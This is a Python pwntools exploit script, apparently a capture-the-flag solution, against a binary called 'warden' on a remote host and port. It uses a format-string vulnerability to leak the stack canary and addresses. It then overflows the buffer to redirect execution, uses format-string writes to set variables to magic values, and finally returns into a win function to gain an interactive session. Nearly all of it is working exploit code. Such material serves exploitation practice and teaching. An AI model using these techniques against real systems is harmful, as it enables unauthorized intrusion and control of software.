#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  9004
HOST = "61.14.233.78"
exe = context.binary = ELF('./warden', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*tft+73
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# Stage 1: Leak canary, stack, exe

fmt = b"%15$p|%19$p|%12$p"
p.sendlineafter(b"breached.", fmt)

canary = int(p.recvuntil(b"|", drop = True),16)
exe_leak = int(p.recvuntil(b"|", drop = True),16)
exe.address = exe_leak - 0x14fd
stack_leak = int(p.recvuntil(b"Pow", drop = True),16)
stack_rip = stack_leak - 0xd8
log.info("canary: " + hex(canary))
log.info("exe_leak: " + hex(exe_leak))
log.info("exe_base: " + hex(exe.address))
log.info("stack_rip: " + hex(stack_rip))

# Stage 2: Return to tft function
# GDB()
pl = flat(b"A"*32, canary, b'B'*12, exe.sym.tft)
p.sendlineafter(b"Pow", pl)

# Stage 3:
# input()
jinx = exe.sym.jinx
mf = exe.sym.mf
trex = exe.sym.trex

fmt = f"%{0x420}c%24$hn".encode()
fmt += f"%{0x1337-0x420}c%23$hn".encode()
fmt += f"%{0xBEEF - 0x1337}c%25$hn".encode()
fmt += f"%{0xDEAD - 0xBEEF}c%26$hn".encode()
pl = fmt.ljust(0x40, b'a')
pl += p32(jinx)
pl += p32(mf)
pl += p32(trex)
pl += p32(trex+2)
p.sendlineafter(b"breached.", pl)

# Stage 4:
pl = flat(b"A"*32, canary, b'B'*12, exe.sym.win, "AAAA", 0x123)
p.sendlineafter(b"Pow", pl)

p.interactive()